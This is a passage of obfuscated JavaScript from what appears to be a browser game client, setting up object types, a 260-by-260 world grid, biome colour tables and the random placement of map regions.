				case ⲆⲆᐃ.ΔⲆΔⲆᐃ:
					this.ΔᐃΔⵠ = ⵠⵠΔⵠⵠᐃⲆ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, ᐃⲆᐃ, ⵠᐃⵠΔ, 0, ΔᐃⲆⲆⵠ, ⵠⲆⲆᐃⵠ),
						"ⵠⲆᐃ": ⵠΔⲆⲆⲆ,
						angle: 0
					};
					this.ᐃΔᐃⵠᐃ = ⵠᐃᐃΔΔᐃΔ;
					break;
				case ⲆⲆᐃ.ⲆΔΔⵠᐃ:
				case ⲆⲆᐃ.ΔⵠΔⲆⲆ:
				case ⲆⲆᐃ.ⲆᐃᐃΔⲆ:
				case ⲆⲆᐃ.ⲆΔⲆᐃᐃ:
				case ⲆⲆᐃ.ᐃΔᐃΔⵠ:
				case ⲆⲆᐃ.ΔᐃΔᐃⵠ:
				case ⲆⲆᐃ.ⵠⵠⵠΔⲆ:
				case ⲆⲆᐃ.ⲆΔᐃΔᐃ:
				case ⲆⲆᐃ.ⲆΔⲆⵠΔ:
				case ⲆⲆᐃ.ⲆⲆΔⵠⲆ:
				case ⲆⲆᐃ.ΔⲆⵠⵠᐃ:
				case ⲆⲆᐃ.ⵠᐃⲆᐃⲆ:
					this.ΔᐃΔⵠ = ⵠⵠΔⵠⵠᐃⲆ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⵠΔⵠΔ, ⵠΔᐃ, 1, 0, 10, 10),
						"ⵠⲆᐃ": ΔᐃⵠᐃⲆ,
						angle: 0
					};
					this.ᐃΔᐃⵠᐃ = ᐃΔᐃⵠᐃ;
					break;
				case ⲆⲆᐃ.ⲆⲆⲆⲆΔ:
					this.ΔᐃΔⵠ = ΔᐃᐃΔΔᐃⲆΔΔ;
					this.opacity = 1;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆⲆᐃⵠ, ⵠⲆΔ, ⵠΔᐃ, ⵠⲆⲆ, ᐃⵠᐃΔⵠ, ΔⲆⵠⲆⲆ),
						"ⵠⲆᐃ": false,
						angle: ΔⲆⵠⲆ
					};
					var ΔⲆⲆⵠΔᐃⵠ = this.angle % (Math.PI / Δᐃⵠⵠ);
					ΔⲆⲆⵠΔᐃⵠ < Math.PI / 4 ? this.angle -= ΔⲆⲆⵠΔᐃⵠ : this.angle += Math.PI / 2 - ΔⲆⲆⵠΔᐃⵠ;
					break;
				case ⲆⲆᐃ.ΔⲆⵠᐃΔ:
					this.ΔᐃΔⵠ = ⲆΔⲆⵠⲆⲆⵠⵠΔ;
					this.angle = Math.PI * Math.random() * Δⵠⵠⵠ;
					break;
				case ⲆⲆᐃ.ΔⵠΔⲆΔᐃΔ:
					this.ΔᐃΔⵠ = ΔΔⲆⲆΔⲆⲆᐃⲆ;
					this.angle = Math.random() * Math.PI * 2;
					break;
				case ⲆⲆᐃ.ᐃᐃΔⲆⵠᐃᐃ:
					this.ΔᐃΔⵠ = ᐃⲆᐃⲆᐃⵠΔⲆᐃ;
					this.angle = Math.random() * Math.PI * ⵠΔᐃᐃⵠ;
					break;
				case ⲆⲆᐃ.ΔᐃΔΔⵠᐃΔ:
					this.ΔᐃΔⵠ = ΔⵠⵠΔⲆⵠⵠᐃⵠ;
					this.angle = Math.random() * Math.PI * ⲆΔΔⵠ;
					break;
				case ⲆⲆᐃ.ΔᐃΔⵠΔᐃΔ:
					this.ΔᐃΔⵠ = ⲆᐃⲆⲆΔⵠΔᐃⵠ;
					this.angle = 2 * (Math.random() * Math.PI);
					break;
				case ⲆⲆᐃ.ⵠⵠⵠᐃⵠ:
					this.ⵠⲆᐃ = function(ⲆⵠⲆΔ) {
						this.lock = this.info & 8192 ? ΔΔᐃⵠ : 0;
						this.info = this.info & 8191;
						this.action = ⲆⵠⲆΔ
					};
					this.ΔᐃΔⵠ = ⵠᐃⲆΔΔⵠⲆⵠΔ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆⲆᐃⵠᐃ, 1, 1, Ⲇᐃⵠⵠ, 10, 10),
						"ⵠⲆᐃ": ᐃⲆᐃⵠΔ,
						angle: ᐃⵠΔ
					};
					this.lock = ΔΔⵠ;
					this.ⵠⲆᐃ(this.action);
					break;
				case ⲆⲆᐃ.ᐃᐃΔΔⲆ:
				case ⲆⲆᐃ.ⲆⲆΔⵠⵠ:
				case ⲆⲆᐃ.ⲆᐃΔΔⲆ:
				case ⲆⲆᐃ.ⲆⵠⲆᐃᐃ:
				case ⲆⲆᐃ.ⵠΔⵠᐃⲆ:
				case ⲆⲆᐃ.ⵠⵠⲆΔⵠ:
				case ⲆⲆᐃ.ⵠᐃᐃⵠᐃ:
				case ⲆⲆᐃ.ⲆΔⵠΔΔ:
				case ⲆⲆᐃ.ⵠᐃⵠⵠᐃ:
				case ⲆⲆᐃ.ⵠⵠⵠᐃⲆ:
				case ⲆⲆᐃ.ⲆⲆⲆⲆⲆ:
				case ⲆⲆᐃ.ⵠⲆΔΔⵠ:
					this.ΔᐃΔⵠ = ⲆⵠⵠᐃᐃⵠΔΔⲆ;
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1, 0, 10, 10),
						"ⵠⲆᐃ": ⲆΔⲆᐃΔ,
						angle: ΔᐃΔΔ
					};
					this.ᐃΔᐃⵠᐃ = ᐃΔᐃⵠᐃ;
					break;
				case ⲆⲆᐃ.ⵠΔⵠΔᐃ:
					this.ⵠᐃⲆⲆᐃ = ΔⵠᐃΔⲆᐃⵠᐃⲆ;
					this.ΔᐃΔⵠ = ⲆΔⲆⵠΔΔⲆᐃⲆ;
					this.ᐃΔⵠᐃΔ = ⲆᐃⲆᐃᐃⵠᐃΔΔ;
					this.ⵠⲆⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(false, 1, 1.23, 1.18, .02, .02);
					this.ΔⲆΔⲆⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ᐃⲆᐃⵠΔ, 1, 1.23, 1.18, .04, .04);
					this.Δᐃⵠ = {
						"ᐃᐃⵠΔ": new ΔΔⲆᐃ.Δⵠᐃᐃ(ΔⵠΔⲆΔ, 1, 1, ⵠᐃⲆᐃ, ᐃⵠᐃΔⵠ, 10),
						"ⵠⲆᐃ": ᐃⵠΔⵠⲆ,
						angle: 0
					};
					this.ⵠⲆᐃ = function(ⲆⵠⲆΔ) {
						this.action = ⲆⵠⲆΔ
					};
					break
			}
		}

		function ⵠⲆⲆᐃᐃΔᐃ(ᐃΔ, Δⵠ, ⲆⵠⲆ, ⲆᐃΔ) {
			this.id = ᐃΔ;
			this.ᐃᐃΔᐃᐃ = (ᐃΔ + 5) * ᐃⵠⵠⵠⲆ;
			this.ᐃⵠΔᐃⵠ = ΔΔΔᐃ / 1366;
			this.x = Δⵠ;
			this.y = ⲆⵠⲆ;
			this.c = Math.sin(ⲆᐃΔ);
			this.ᐃⵠⲆΔ = Math.cos(ⲆᐃΔ);
			this.alpha = 0
		}

		function ⵠᐃΔΔᐃⲆⵠᐃᐃ(ⵠᐃᐃⲆΔⲆΔ) {
			this.mode = ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ;
			this.ⵠᐃᐃⲆΔⲆΔ = ⵠᐃᐃⲆΔⲆΔ;
			this.ᐃᐃⲆᐃⲆ = ⲆⲆⲆᐃ;
			this.ΔⲆΔᐃⵠΔⲆ = 6;
			this.ᐃᐃᐃⵠ = [];
			this.ΔⲆᐃ = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆᐃⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠΔⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔΔⲆⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⲆⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔΔᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠᐃⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⵠⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠⵠⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃᐃΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⵠΔΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆᐃⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠᐃᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆΔᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⵠᐃᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔΔⵠᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⵠΔᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠⵠΔⵠⵠᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃⲆΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⵠᐃⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⵠⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠΔⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆⵠΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠⵠᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⲆᐃⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔⵠᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃᐃΔⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆᐃᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔᐃΔⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔᐃⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⵠΔΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔΔⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔΔⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃΔΔⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆᐃᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⲆΔⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠΔΔⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆΔⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆΔⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆⲆΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⲆⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⲆᐃΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃⲆᐃⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔⵠⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⲆⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⵠⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔΔᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⵠⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⲆ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆᐃ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆᐃΔⵠ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆΔⵠΔ] = [];
			this.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆⲆᐃ] = [];
			this.ᐃⲆⵠⵠⲆ = [];
			this.ᐃΔᐃᐃΔ = 260;
			this.ⵠᐃⵠⲆⵠ = 260;
			this.ᐃⲆⵠⲆᐃΔᐃ = ᐃⵠΔᐃᐃ;
			this.ⲆⲆⵠᐃⵠⵠⵠ = 100;
			this.w = this.ᐃΔᐃᐃΔ * this.ᐃⲆⵠⲆᐃΔᐃ;
			this.ⵠⵠᐃ = this.ⲆⲆⵠᐃⵠⵠⵠ * this.ⵠᐃⵠⲆⵠ;
			this.ᐃⵠΔΔⲆ = new ᐃⵠΔΔⲆ.ᐃⵠⵠΔΔᐃⲆ;
			this.ᐃⵠⵠⵠⵠ = [];
			this.ᐃΔΔⵠ = new ΔΔⲆᐃ.Δⵠᐃᐃ(ⲆᐃⵠⲆⵠ, ΔΔⵠⵠ, 1, 0, ⵠΔⲆ, ΔⲆᐃᐃ);
			this.transition = false;
			this.ΔⲆⵠⵠΔ = [];
			this.ⲆΔΔᐃΔ = 0;
			this.ΔᐃΔⵠᐃⵠΔ = ΔΔᐃⵠ;
			this.ΔⲆⵠᐃⲆⵠⵠ = ᐃⲆⵠᐃΔ;
			this.ⵠΔᐃⲆⵠΔⲆ = ΔΔᐃΔ;
			this.ⵠᐃΔᐃⲆ = ⲆⵠᐃⲆ;
			this.ⵠⵠΔΔΔΔᐃ = 10;
			this.ΔⲆⵠⵠΔ[this.ⲆΔΔᐃΔ] = {
				"ᐃⵠⵠΔᐃⵠΔ": ΔⲆᐃᐃ,
				"ᐃΔⲆ": [19, 58, 43],
				"ΔΔᐃ": [4, 43, 48],
				"ⵠᐃᐃⵠⲆ": [ⵠ[30], ⵠ[331]]
			};
			this.ΔⲆⵠⵠΔ[this.ⵠᐃΔᐃⲆ] = {
				"ᐃⵠⵠΔᐃⵠΔ": 0,
				"ᐃΔⲆ": [11, 106, 132],
				"ΔΔᐃ": [9, 55, 63],
				"ⵠᐃᐃⵠⲆ": [ⵠ[124], ⵠ[283]]
			};
			this.ΔⲆⵠⵠΔ[this.ΔᐃΔⵠᐃⵠΔ] = {
				"ᐃⵠⵠΔᐃⵠΔ": 0,
				"ᐃΔⲆ": [235, 242, 240],
				"ΔΔᐃ": [19, 97, 103],
				"ⵠᐃᐃⵠⲆ": [ⵠ[560], ⵠ[112]]
			};
			this.ΔⲆⵠⵠΔ[this.ΔⲆⵠᐃⲆⵠⵠ] = {
				"ᐃⵠⵠΔᐃⵠΔ": 0,
				"ᐃΔⲆ": [45, 32, 23],
				"ΔΔᐃ": [3, 28, 30],
				"ⵠᐃᐃⵠⲆ": ["#2D2017", "#031C1E"]
			};
			this.ΔⲆⵠⵠΔ[this.ⵠΔᐃⲆⵠΔⲆ] = {
				"ΔΔᐃ": [24, 61, 60],
				"ᐃΔⲆ": [74, 74, 74],
				"ⵠᐃᐃⵠⲆ": ["#4A4A4A", "#183D3C"],
				"ᐃⵠⵠΔᐃⵠΔ": 0
			};
			this.ΔⲆⵠⵠΔ[this.ⵠⵠΔΔΔΔᐃ] = {
				"ΔΔᐃ": [9, 61, 56],
				"ⵠᐃᐃⵠⲆ": ["#EBD8A6", "#093D38"],
				"ᐃΔⲆ": [235, 216, 166],
				"ᐃⵠⵠΔᐃⵠΔ": 0
			};
			this.ΔⵠᐃⲆᐃⲆⵠ = function(ΔᐃⲆ, Δⵠ, ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ, ΔᐃΔ) {
				this.x1 = Δⵠ * ⲆᐃΔⵠⵠ;
				this.y1 = ᐃᐃᐃⲆⲆᐃⲆ * ⲆⵠⲆ;
				this.w = ᐃⵠⵠ * 100;
				this.ⵠⵠᐃ = ⵠⵠᐃ * 100;
				this.x2 = (Δⵠ + ᐃⵠⵠ) * ΔᐃⵠⲆⲆ;
				this.y2 = ⲆⵠᐃΔⲆ * (ⲆⵠⲆ + ⵠⵠᐃ);
				this.ΔᐃⲆ = ΔᐃⲆ;
				if (undefined === ΔᐃΔ) this.ΔᐃΔ = 15;
				else this.ΔᐃΔ = ΔᐃΔ
			};

			function ΔΔⵠᐃⵠΔⵠⵠⵠ(ᐃᐃⵠⵠ, ᐃⵠⵠΔᐃⵠᐃ, ΔⵠᐃⲆⲆΔΔ, ᐃⵠΔΔⵠ, ⲆⵠΔⲆΔⵠⲆ) {
				var ᐃⵠⵠ = ᐃⵠⵠΔᐃⵠᐃ + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * ᐃⵠΔΔⵠ);
				var ⵠⵠᐃ = ΔⵠᐃⲆⲆΔΔ + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * ᐃⵠΔΔⵠ);
				var ⵠᐃⵠⵠ = ᐃᐃⲆⵠⵠ + Math.floor((ⲆⲆⲆ.ᐃΔᐃᐃΔ - ᐃⵠⵠ - 20) * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
				var ᐃᐃⵠⲆ = 10 + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * (ⲆⲆⲆ.ⵠᐃⵠⲆⵠ - ⵠⵠᐃ - Δⵠᐃᐃᐃ));
				var ⵠⵠΔᐃ = ⵠᐃⵠⵠ + ᐃⵠⵠ;
				var ΔᐃⵠⲆ = ᐃᐃⵠⲆ + ⵠⵠᐃ;
				for (var ⵠᐃ = ⵠⲆᐃⵠ; ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
					if (1 === ΔΔⲆᐃ.ᐃᐃΔⵠΔⲆᐃ(ⵠᐃⵠⵠ, ⵠⵠΔᐃ, ᐃᐃⵠⲆ, ΔᐃⵠⲆ, ᐃⲆⲆⵠ.x1 / 100 - ⲆⵠΔⲆΔⵠⲆ, ᐃⲆⲆⵠ.x2 / 100 + ⲆⵠΔⲆΔⵠⲆ, ᐃⲆⲆⵠ.y1 / ⵠᐃⲆΔΔ - ⲆⵠΔⲆΔⵠⲆ, ᐃⲆⲆⵠ.y2 / 100 + ⲆⵠΔⲆΔⵠⲆ)) return 0
				}
				ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.push(new ⲆⲆⲆ.ΔⵠᐃⲆᐃⲆⵠ(ᐃᐃⵠⵠ, ⵠᐃⵠⵠ, ᐃᐃⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ, 15));
				return 1
			}

			function ᐃⲆⲆⵠⲆⲆᐃⵠΔ(ᐃᐃⵠⵠ, ᐃⵠⵠΔᐃⵠᐃ, ΔⵠᐃⲆⲆΔΔ, ᐃⵠΔΔⵠ, ΔⵠᐃⵠᐃᐃⲆ) {
				for (var ⵠᐃ = Ⲇᐃⵠⵠ; ΔⵠᐃⵠᐃᐃⲆ > ⵠᐃ; ⵠᐃ++) {
					if (1 === ΔΔⵠᐃⵠΔⵠⵠⵠ(ᐃᐃⵠⵠ, ᐃⵠⵠΔᐃⵠᐃ, ΔⵠᐃⲆⲆΔΔ, ᐃⵠΔΔⵠ, ⵠⲆⲆΔΔ)) break
				}
				if (ⵠᐃ === ΔⵠᐃⵠᐃᐃⲆ) return 0;
				return ΔⲆⵠ
			}

			function ᐃᐃⵠᐃⵠᐃΔⲆⵠ(ᐃⲆᐃΔⲆΔⵠ, ⵠΔⲆⲆⵠ, ⲆΔᐃΔΔ) {
				var stop = ⵠΔⲆⵠ;
				var ⵠΔⲆΔⲆ = ⵠΔⲆⲆⵠ;
				for (var ⲆⵠⲆ = ⲆΔᐃΔΔ; ⲆⵠⲆ < ⲆⲆⲆ.ⵠᐃⵠⲆⵠ; ⲆⵠⲆ++) {
					for (var Δⵠ = ⵠΔⲆⲆⵠ; ⲆⲆⲆ.ᐃΔᐃᐃΔ > Δⵠ; Δⵠ++) {
						if (ⲆΔᐃΔΔ === ⲆⵠⲆ) ⵠΔⲆΔⲆ = Math.max(Δⵠ, ⵠΔⲆΔⲆ);
						if (Δⵠ > ⵠΔⲆΔⲆ) break;
						if (ᐃⲆᐃΔⲆΔⵠ[ⲆⵠⲆ][Δⵠ] === 1) break;
						ᐃⲆᐃΔⲆΔⵠ[ⲆⵠⲆ][Δⵠ] = ⵠΔⲆ
					}
					if (ⵠΔⲆΔⲆ > Δⵠ) break
				}
				ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.push(new ⲆⲆⲆ.ΔⵠᐃⲆᐃⲆⵠ(ⲆⲆⲆ.ⵠᐃΔᐃⲆ, ⵠΔⲆⲆⵠ, ⲆΔᐃΔΔ, ⵠΔⲆΔⲆ - ⵠΔⲆⲆⵠ + ΔᐃᐃⲆ, ⲆⵠⲆ - ⲆΔᐃΔΔ, 15))
			}
			this.ⵠᐃⵠΔⲆ = -1e6;
			this.ⵠΔΔⲆΔ = this.ⵠᐃⵠΔⲆ;
			this.ᐃᐃⲆΔⲆ = this.ⵠᐃⵠΔⲆ;
			this.ΔⵠΔΔⵠ = this.ⵠᐃⵠΔⲆ;
			this.ΔⵠⵠⵠⵠΔⲆ = this.ⵠᐃⵠΔⲆ;
			this.ΔⲆⲆᐃⵠⲆⵠ = this.ⵠᐃⵠΔⲆ;
			this.ⵠⲆΔⲆⵠ = this.ⵠᐃⵠΔⲆ;
			this.ⵠᐃᐃΔᐃⲆⲆΔΔ = function(ⵠΔⲆΔ) {
				var Δⵠ = ⵠΔⲆΔ.r.x;
				var ⲆⵠⲆ = ⵠΔⲆΔ.r.y;
				var ⵠᐃ = Math.floor(ⲆⵠⲆ / ⲆⵠᐃΔⲆ);
				var ᐃⵠᐃⵠ = Math.floor(Δⵠ / 100);
				ⵠΔⲆΔ.ⵠΔΔⲆΔ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⵠΔⲆΔ.ᐃᐃⲆΔⲆ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⵠΔⲆΔ.ΔⵠΔΔⵠ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⵠΔⲆΔ.ΔⵠⵠⵠⵠΔⲆ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⵠΔⲆΔ.ⵠⲆΔⲆⵠ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				ⵠΔⲆΔ.ⵠⲆΔⲆΔⲆᐃ = ⲆⲆⲆ.ⵠᐃⵠΔⲆ;
				for (var ⵠᐃⲆⲆ = 0; ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ; ⵠᐃⲆⲆ++) {
					if (ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ⲆΔΔᐃΔ) {
						var ΔΔⲆΔⲆΔᐃ = ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ);
						ⵠΔⲆΔ.ΔⵠⵠⵠⵠΔⲆ = Math.max(ⵠΔⲆΔ.ΔⵠⵠⵠⵠΔⲆ, ΔΔⲆΔⲆΔᐃ);
						if (ΔΔⲆΔⲆΔᐃ > ᐃⵠⲆⵠ && ⵠᐃⵠΔ === ⲆⲆⲆ.ⲆΔᐃⵠⲆᐃΔⵠⵠ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ)) ⵠΔⲆΔ.ⵠⲆΔⲆΔⲆᐃ = ΔΔᐃⵠ
					} else if (ⲆⲆⲆ.ΔᐃΔⵠᐃⵠΔ === ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ) {
						ⵠΔⲆΔ.ⵠΔΔⲆΔ = Math.max(ⵠΔⲆΔ.ⵠΔΔⲆΔ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ))
					} else if (ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ⵠⵠΔΔΔΔᐃ) {
						ⵠΔⲆΔ.ᐃᐃⲆΔⲆ = Math.max(ⵠΔⲆΔ.ᐃᐃⲆΔⲆ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ))
					} else if (ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ΔⲆⵠᐃⲆⵠⵠ) {
						ⵠΔⲆΔ.ΔⵠΔΔⵠ = Math.max(ⵠΔⲆΔ.ΔⵠΔΔⵠ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ))
					} else ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃⲆⲆ].ΔᐃⲆ === ⲆⲆⲆ.ⵠΔᐃⲆⵠΔⲆ && (ⵠΔⲆΔ.ⵠⲆΔⲆⵠ = Math.max(ⵠΔⲆΔ.ⵠⲆΔⲆⵠ, ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ⵠᐃⲆⲆ, Δⵠ, ⲆⵠⲆ)))
				}
				if (ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ][ⵠ[271]]) ⵠΔⲆΔ.ⵠⲆΔⲆΔⲆᐃ = ΔⲆᐃᐃ;
